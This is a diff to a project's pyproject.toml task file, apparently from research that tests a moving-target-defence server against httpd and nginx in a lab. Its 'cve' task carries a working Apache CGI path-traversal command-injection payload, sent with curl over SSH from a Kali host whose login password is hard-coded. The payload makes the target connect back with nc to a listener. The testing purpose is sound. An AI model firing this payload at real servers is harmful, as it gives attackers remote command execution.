@@ -37,19 +37,32 @@ coverage = "sudo -E poetry run coverage run -m behave"
 
 [tool.poe.tasks.cve]
 shell = """
-nc -lnvp 4444 -k > $out 2>&1 &
-PID_NC=$!
-poe mass --lower $lower --upper $upper &
-PID_MASS=$!
-sleep 5
-for i in $(seq 1 $n); do
-  sshpass -p 'kali' ssh kali@192.168.161.128 'curl "192.168.161.133/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "A=|echo; nc 172.17.0.1 4444"> /dev/null 2>&1'
-  sleep 1
-done
-kill $PID_MASS
-kill $PID_NC
-total=$(grep "Connection received on" $out | wc -l) 
-echo "$total/$n" > $out
+if [ ! -z "$server" ]; then
+    case "$server" in
+        mass)
+        exec_server="poe mass --lower $lower --upper $upper &"
+        ;;
+        httpd)
+        exec_server="sudo docker run -p 80:80 -v ./html:/usr/local/apache2/htdocs httpd &"
+        ;;
+        nginx)
+        exec_server="sudo docker run -p 80:80 -v ./html:/var/www/localhost/htdocs nginx &"
+        ;;
+    esac
+  nc -lnvp 4444 -k > $out 2>&1 &
+  PID_NC=$!
+  eval $exec_server
+  PID_SERVER=$!
+  sleep 5
+  for i in $(seq 1 $n); do
+    sshpass -p 'kali' ssh kali@192.168.161.128 'curl "192.168.161.133/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "A=|echo; nc 172.17.0.1 4444"> /dev/null 2>&1'
+    sleep 1
+  done
+  kill $PID_SERVER
+  kill $PID_NC
+  total=$(grep "Connection received on" $out | wc -l) 
+  echo "$total/$n" > $out
+fi
 """
   [[tool.poe.tasks.cve.args]]
   name = "n"
@@ -67,17 +80,37 @@ echo "$total/$n" > $out
   name = "lower"
   help = "Lower time for the time bounds"
   default = "15"
+  [[tool.poe.tasks.cve.args]]
+  name = "server"
+  help = "server to use"
 
 
 [tool.poe.tasks.all-scenarios]
 shell = """
-poe cve --out tests/results/cve_results_u15_l15.csv --upper 15 --lower 15 --n 250
-poe cve --out tests/results/cve_results_u20_l15.csv --upper 20 --lower 15 --n 250
-poe cve --out tests/results/cve_results_u20_l20.csv --upper 20 --lower 20 --n 250
+echo httpd
+out=tests/results/httpd.csv
+sudo docker run -p 80:80 -v ./html:/usr/local/apache2/htdocs -d httpd && poe stats --out $out && sleep 300; sudo docker kill $(sudo docker ps -q --filter ancestor=httpd) & poe kill-stats; poe graph --in $out --out $out.png
+echo nginx
+out=tests/results/nginx.csv
+sudo docker run -p 80:80 -v ./html:/var/www/localhost/htdocs -d nginx && poe stats --out $out && sleep 300; sudo docker kill $(sudo docker ps -q --filter ancestor=nginx) & poe kill-stats; poe graph --in $out --out $out.png
+echo mass 15 15
 poe full-run --out tests/results/mtd-no-petition_u15_l15.csv --upper 15 --lower 15
+echo mass 15 20
 poe full-run --out tests/results/mtd-no-petition_u20_l15.csv --upper 20 --lower 15
+echo mass 20 20
 poe full-run --out tests/results/mtd-no-petition_u20_l20.csv --upper 20 --lower 20
+echo httpd cve
+echo mass cve
+poe cve --out tests/results/cve_results_httpd.csv --server httpd --n 250
+echo mass cve 15 15
+poe cve --out tests/results/cve_results_u15_l15.csv --server mass --upper 15 --lower 15 --n 250
+echo mass cve 15 20
+poe cve --out tests/results/cve_results_u20_l15.csv --server mass --upper 20 --lower 15 --n 250
+echo mass cve 20 20
+poe cve --out tests/results/cve_results_u20_l20.csv --server mass --upper 20 --lower 20 --n 250
 """
+
+
 
 [tool.poe.tasks.full-run]
 shell = "poe check; poe images; poe stats --interval $interval --out $out; poe mass --upper $upper --lower $lower; poe kill-stats; poe graph --in $out --out $out.png"
